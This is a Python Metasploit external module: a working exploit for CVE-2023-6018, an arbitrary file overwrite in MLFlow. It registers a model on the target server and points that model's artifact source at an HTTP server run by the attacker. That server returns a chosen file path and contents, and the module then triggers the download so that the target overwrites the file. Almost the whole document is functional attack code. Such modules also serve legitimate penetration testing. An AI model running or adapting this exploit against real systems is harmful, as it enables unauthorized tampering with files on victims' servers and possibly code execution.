#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import random
import string
import json
import socket
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

# extra modules
dependencies_missing = False
try:
    import requests
    from requests import Request, Session
except ImportError:
    dependencies_missing = True

from metasploit import module


metadata = {
    'name': 'MLFlow arbitrary file overwrite',
    'description': '''
        MLFlow before X is vulnerable to a arbitrary file overwrite.
    ''',
    'authors': [
        'Kevin Mizu <@kevin_mizu>'
        'byt3bl33d3r <marcello@protectai.com>',
    ],

    'rank': 'excellent',
    'date': '2023-11-15',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30/'},
        {'type': 'cve', 'ref': 'CVE-2023-6018'}
    ],
    'type': 'single_scanner',
    'options': {
        'localfilepath': {'type': 'string', 'description': 'Local path with content to overwrite on target (cannot be used with filecontents option)', 'required': False, 'default': None},
        'remotefilepath': {'type': 'string', 'description': 'File to overwrite', 'required': True, 'default': '/tmp/HACKED'},
        'filecontents': {'type': 'string', 'description': 'File content to overwrite (cannot be used with localfilepath option)', 'required': False, 'default': None},
        'serverport': {'type': 'port', 'description': 'HTTP server port to bind to', 'required': True, 'default': 4444},
        #'serverip': {'type': 'string', 'description': 'HTTP server ip to bind to', 'required': True, 'default': socket.gethostbyname(socket.gethostname()) },
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 5000},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them to their correct types manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

class MLFlowExploitRequestHandler(SimpleHTTPRequestHandler):
    MSF_ARGS = None
    #def __init__(self, msf_args, *args, **kwargs) -> None:
    #    self.msf_args = msf_args
    #    logging.info(f"Started HTTP Server")
    #    super().__init__(args, kwargs)

    @property
    def url(self):
        return urlparse(self.path)

    def do_GET(self):
        payload = {
            "files": [
                {
                    "path": MLFlowExploitRequestHandler.MSF_ARGS["remotefilepath"],
                    "is_dir": False,
                    "file_size": 50
                }
            ]
        }

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()

        if '/api/2.0/mlflow-artifacts/artifacts' == self.url.path:
            
            logging.info("Received callback for file path")
            self.wfile.write(json.dumps(payload).encode())
        else:
            logging.info("Received callback for file contents")
            self.wfile.write(MLFlowExploitRequestHandler.MSF_ARGS["filecontents"].encode())

def random_model_name_generator():
    return ''.join(random.choice(string.ascii_letters) for _ in range(6))

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    if not args['localfilepath'] and not args['filecontents']:
        logging.error('localfilepath or filecontents options must be specified')
        return

    model_name = random_model_name_generator()

    server_ip = socket.gethostbyname(socket.gethostname())
    server_port = args['serverport']
    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"

    logging.info(f"Creating model '{model_name}'")

    r = requests.post(f"{base_url}/ajax-api/2.0/mlflow/registered-models/create", json={"name": model_name})
    logging.debug(r.text)

    logging.info(f"Associating remote artifact source with model '{model_name}'")
    r = requests.post(
        f"{base_url}/ajax-api/2.0/mlflow/model-versions/create",
        json={"name": model_name, "source": f"http://{server_ip}:{server_port}/api/2.0/mlflow-artifacts/artifacts/"}
    )
    logging.debug(r.text)

    r = requests.post(
        f"{base_url}/ajax-api/2.0/mlflow/model-versions/create",
        json={"name": model_name, "source": f"models:/{model_name}/1"}
    )
    logging.debug(r.text)

    MLFlowExploitRequestHandler.MSF_ARGS = args
    server = HTTPServer(
        (server_ip, server_port),
        MLFlowExploitRequestHandler
    )

    logging.info(f"Starting HTTP Server on {server_ip}:{server_port}")
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    logging.info("Triggering artifact download")
    r = requests.get(
        f"{base_url}/model-versions/get-artifact",
        params={"path": "random", "name": model_name, "version": 2}
    )

    logging.debug(r.text)

    if r.status_code == 500:
        logging.info(f"Exploit might have succeeded. Status: {r.status_code}")

if __name__ == '__main__':
    module.run(metadata, run)
